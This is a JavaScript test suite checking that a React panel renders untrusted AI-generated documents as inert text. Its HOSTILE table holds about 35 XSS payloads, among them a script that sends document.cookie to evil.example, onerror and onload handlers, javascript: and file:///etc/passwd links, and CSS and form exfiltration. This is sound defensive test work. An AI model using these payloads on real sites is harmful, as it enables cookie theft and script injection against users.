// Model output is untrusted. Everything a generated document (or a template/source name) can contain must reach
// the screen as inert text: no script, no handlers, no remote loads, no navigation, no embedded documents.
import { test, before } from "node:test";
import assert from "node:assert/strict";
import { loadEntry, react, server } from "./helpers.mjs";

let E, h, html;
before(async () => {
  E = await loadEntry();
  h = react().createElement;
  html = (el) => server().renderToStaticMarkup(el);
});
const noop = () => {};

const HOSTILE = {
  "script tag": "<script>fetch('https://evil.example/?c='+document.cookie)</script>",
  "img onerror": "<img src=x onerror=alert(1)>",
  "img remote markdown": "![t](https://evil.example/pixel.png)",
  "img data uri": "![t](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)",
  "javascript link": "[click](javascript:alert(1))",
  "javascript mixed case": "[click](JaVaScRiPt:alert(1))",
  "javascript entity": "[click](jav&#x09;ascript:alert(1))",
  "javascript whitespace": "[click](  javascript:alert(1))",
  "vbscript link": "[click](vbscript:msgbox(1))",
  "data html link": "[click](data:text/html,<script>alert(1)</script>)",
  "file link": "[click](file:///etc/passwd)",
  "reference link": "[a][1]\n\n[1]: javascript:alert(1)",
  "autolink": "<javascript:alert(1)>",
  "svg onload": "<svg onload=alert(1)><circle/></svg>",
  "svg foreignObject": "<svg><foreignObject><iframe src='https://evil.example'></iframe></foreignObject></svg>",
  "iframe": "<iframe src='https://evil.example'></iframe>",
  "iframe nesting": "<iframe srcdoc='<iframe src=https://evil.example>'></iframe>",
  "meta refresh": "<meta http-equiv='refresh' content='0;url=https://evil.example'>",
  "form submit": "<form action='https://evil.example' method=post><input name=x><button>go</button></form>",
  "link stylesheet": "<link rel=stylesheet href='https://evil.example/x.css'>",
  "style import": "<style>@import url(https://evil.example/x.css); body{background:url(https://evil.example/a)}</style>",
  "inline style exfil": "<div style=\"background:url('https://evil.example/leak?x=1')\">x</div>",
  "css attr exfil": "<input value=secret style='background:url(https://evil.example/?v=1)'>",
  "object embed": "<object data='https://evil.example/x.swf'></object><embed src='https://evil.example/x'>",
  "base href": "<base href='https://evil.example/'>",
  "details ontoggle": "<details open ontoggle=alert(1)>x</details>",
  "mermaid click": "```mermaid\ngraph TD\n  A-->B\n  click A callback \"alert(1)\"\n  click B href \"javascript:alert(1)\"\n  A[<img src=x onerror=alert(1)>]\n```",
  "html fence": "```html\n<script>alert(1)</script><img src=x onerror=alert(1)>\n```",
  "svg fence": "```svg\n<svg onload=alert(1)></svg>\n```",
  "table cell html": "| a | b |\n|---|---|\n| <img src=x onerror=alert(1)> | <script>x</script> |",
  "heading html": "# <img src=x onerror=alert(1)>",
  "link title injection": "[a](https://example.com \"x\" onmouseover=\"alert(1)\")",
  "nul and bidi": "\u0000<scr\u0000ipt>alert(1)</scr\u0000ipt>‮",
  "protocol-relative": "[a](//evil.example/x)",
  "unicode javascript": "[a](java script:alert(1))",
};

/** The rendered document only (the panel's own buttons and form are ours, not the model's). */
function docRegion(whole) {
  const a = whole.indexOf('<div class="dg-doc">');
  const b = whole.indexOf('<form class="dg-refine">');
  assert.ok(a >= 0 && b > a, "document region found");
  return whole.slice(a, b);
}

/** Every tag (name and attributes) in the markup; text content is not part of it. */
const tagsOf = (out) => out.match(/<[a-zA-Z/!][^>]*>/g) ?? [];
const ALLOWED_TAGS = new Set(["div", "p", "h2", "h3", "h4", "h5", "h6", "a", "button", "code", "pre", "strong", "em", "del", "ul", "ol", "li", "blockquote", "hr", "table", "thead", "tbody", "tr", "th", "td", "figure", "figcaption", "span", "br", "input", "details", "summary"]);

function assertInert(name, out) {
  for (const tag of tagsOf(out)) {
    const el = /^<\/?([a-zA-Z0-9]+)/.exec(tag)?.[1]?.toLowerCase() ?? "";
    assert.ok(ALLOWED_TAGS.has(el), `${name}: unexpected element <${el}> in ${tag}`);
    assert.doesNotMatch(tag, /\son[a-z]+\s*=/i, `${name}: event handler attribute in ${tag}`);
    assert.doesNotMatch(tag, /\s(src|srcdoc|style|action|formaction|xlink:href|data|poster|background)\s*=/i, `${name}: loading/style attribute in ${tag}`);
    const href = /\shref="([^"]*)"/i.exec(tag);
    if (href) {
      assert.match(href[1], /^(https:\/\/|http:\/\/|mailto:)/i, `${name}: href with a non-web scheme: ${href[1]}`);
      assert.doesNotMatch(href[1], /javascript:|data:|vbscript:|file:/i, `${name}: unsafe href ${href[1]}`);
      assert.match(tag, /rel="noopener noreferrer"/, `${name}: external link without noopener`);
    }
  }
}

const run = (doc, extra = {}) => ({
  surface: "visual",
  run: { ...E.INITIAL_RUN, phase: "done", doc, ...extra },
  onCancel: noop, onRetry: noop, onRefine: noop, onSave: noop, onSaveAsNew: noop, onOpenSaved: noop, onDiscard: noop, onOpenExternal: noop, onOpenSettings: noop, onSignIn: noop, initialSections: 99,
});

for (const [name, text] of Object.entries(HOSTILE)) {
  test(`hostile document renders inert: ${name}`, () => {
    const whole = html(h(E.ResultPanel, run(`# Report\n\n${text}\n\nafter`)));
    const out = docRegion(whole);
    assertInert(name, out);
    // Any "javascript:" that survives is escaped, visible text, never inside a tag or attribute.
    for (const m of out.matchAll(/javascript:/gi)) {
      const before = out.slice(0, m.index);
      assert.ok(before.lastIndexOf("<") <= before.lastIndexOf(">"), `${name}: javascript: inside a tag`);
    }
    assert.match(out, /after/, "document continues after the hostile block");
  });
}

test("hostile names and messages are escaped everywhere they are shown", () => {
  const evil = "<img src=x onerror=alert(1)>";
  const name = "a<script>alert(1)</script>.md";
  const sel = new E.SourceSelection().add([E.fileItem(`src/${name}`, 10), E.noteItem("n/x.md", 5, evil)]).selection;
  const out = html(h(E.SourcePanel, { env: { notes: null, fs: null }, selection: sel, note: evil, surface: "doc", onAdd: noop, onRemove: noop, onClear: noop, onPaste: () => true, initialViewport: 200 }));
  assert.doesNotMatch(out, /<script|<img/i);
  assert.match(out, /&lt;script&gt;/);
  const res = html(h(E.ResultPanel, run("x", { notice: evil, editError: evil, skipped: [evil], saved: { path: name, hash: "h", size: 1, stem: "s" } })));
  assert.doesNotMatch(res, /<script|<img/i);
  const tm = html(h(E.TemplateManager, { templates: [{ id: "t", name: evil, sections: [evil], rawContent: "", isBuiltin: false, folderName: "t", isProjectTemplate: true, surface: "doc" }], busy: false, error: { message: evil, retryable: false, action: "none" }, onSave: async () => null, onDelete: async () => true, onClose: noop }));
  assert.doesNotMatch(tm, /<script|<img/i);
});

test("a 2 MB generated document opens quickly and mounts only the first sections", () => {
  const para = "Paragraph with **bold** text and a [link](https://example.com/x) inside it, repeated to be long.\n\n";
  const doc = para.repeat(Math.ceil((2 * 1024 * 1024) / para.length));
  assert.ok(doc.length >= 2 * 1024 * 1024);
  const t0 = performance.now();
  const out = docRegion(html(h(E.ResultPanel, { ...run(doc), initialSections: 2 })));
  const ms = performance.now() - t0;
  const paragraphs = (out.match(/<p>/g) ?? []).length;
  assert.ok(paragraphs <= 2 * 120 + 5, `mounted ${paragraphs} paragraphs`);
  assert.match(out, /Show more \(\d+ sections left\)/);
  assert.ok(ms < 3000, `parse+render took ${ms.toFixed(0)} ms`);
});
